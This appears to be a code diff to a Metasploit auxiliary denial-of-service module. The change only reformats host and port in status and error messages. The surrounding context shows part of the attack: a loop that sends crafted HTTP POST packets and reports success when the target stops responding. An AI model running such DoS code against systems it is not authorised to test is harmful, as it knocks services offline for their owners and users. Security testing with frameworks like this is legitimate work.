@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
     for x in 1..datastore['RLIMIT']
       begin
         connect
-        print_status("Sending DoS packet #{x} to #{rhost}:#{rport}")
+        print_status("Sending DoS packet #{x} to #{Rex::Socket.to_authority(rhost, rport)}")
 
         sploit = "POST / HTTP/1.1\r\n"
         sploit << 'Host: ' + rhost + "\r\n"
@@ -63,11 +63,11 @@ class MetasploitModule < Msf::Auxiliary
 
         print_error('DoS packet unsuccessful')
       rescue ::Rex::ConnectionRefused
-        print_error("Unable to connect to #{rhost}:#{rport}")
+        print_error("Unable to connect to #{Rex::Socket.to_authority(rhost, rport)}")
       rescue ::Errno::ECONNRESET
         print_good("DoS packet successful. #{rhost} not responding.")
       rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-        print_error("Couldn't connect to #{rhost}:#{rport}")
+        print_error("Couldn't connect to #{Rex::Socket.to_authority(rhost, rport)}")
       rescue ::Timeout::Error, ::Errno::EPIPE => e
         vprint_error(e.message)
       end
